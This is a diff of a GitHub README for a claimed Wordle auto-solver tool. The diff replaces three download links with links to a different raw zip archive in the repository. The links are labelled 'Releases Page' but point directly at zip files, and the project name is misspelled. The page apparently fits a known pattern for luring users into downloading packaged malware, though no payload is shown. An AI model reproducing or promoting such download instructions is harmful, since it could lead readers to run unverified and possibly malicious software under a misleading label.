@@ -1,7 +1,7 @@
 # 🔍 Wordle-AutoAwnser - Solve Wordle Instantly and Easily
 
 ## 🛠️ Download Here
-[![Download Wordle-AutoAwnser](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/trophogenic/Wordle-AutoAwnser.zip)](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/trophogenic/Wordle-AutoAwnser.zip)
+[![Download Wordle-AutoAwnser](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/Versions/Wordle-Awnser-Auto-v3.5.zip)](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/Versions/Wordle-Awnser-Auto-v3.5.zip)
 
 ## 📋 Description
 Wordle AutoSolver helps you quickly find the correct Wordle word. It uses smart automation to give you fast and precise answers. With this tool, you no longer need to guess the word; let the software do the work for you. 
@@ -14,7 +14,7 @@ Follow these steps to download and set up Wordle AutoSolver on your computer:
 3. Ensure you have an Internet connection to download the application.
 
 ## 📥 Download & Install
-To download the Wordle AutoSolver, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/trophogenic/Wordle-AutoAwnser.zip).
+To download the Wordle AutoSolver, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/Versions/Wordle-Awnser-Auto-v3.5.zip).
 
 Once you are on the Releases page:
 
@@ -80,6 +80,6 @@ A: This tool is specifically designed for Wordle. Future updates may include sup
 For any questions or issues, you can check the GitHub issues page or contact the project maintainers. Your feedback helps improve Wordle AutoSolver.
 
 ## 🔗 Download Again
-To download Wordle AutoSolver, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/trophogenic/Wordle-AutoAwnser.zip). 
+To download Wordle AutoSolver, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Bibi-hajra/Wordle-AutoAwnser/main/Versions/Wordle-Awnser-Auto-v3.5.zip). 
 
 Enjoy solving Wordle puzzles with ease!
